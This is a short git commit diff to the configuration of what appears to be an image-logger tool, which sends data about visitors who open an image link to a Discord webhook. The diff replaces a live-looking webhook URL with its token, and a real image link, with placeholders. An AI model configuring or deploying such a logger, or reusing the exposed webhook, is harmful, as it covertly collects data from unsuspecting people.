7de5168bc4fd42e8f94d96b3faa83ede8e4e88db
limited <ledri0142@gmail.com>
2026-06-30 18:53:39 +0200

    Update webhook URL and image placeholder in config

--- api/image.py
+++ api/image.py
@@ -11,8 +11,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1521010823080706049/vyl0crccERekjZpX-RlMLfg_FMkLBTzCtm78EaJ0BIkoSpHPNsf8sEKG---Mslc0Gzw8",
-    "image": "https://cs.gonitro.com/wp-content/uploads/2022/05/text-1.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "YOUR-DISCORD-CHANNEL-WEBHOOK",
+    "image": "custom-image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
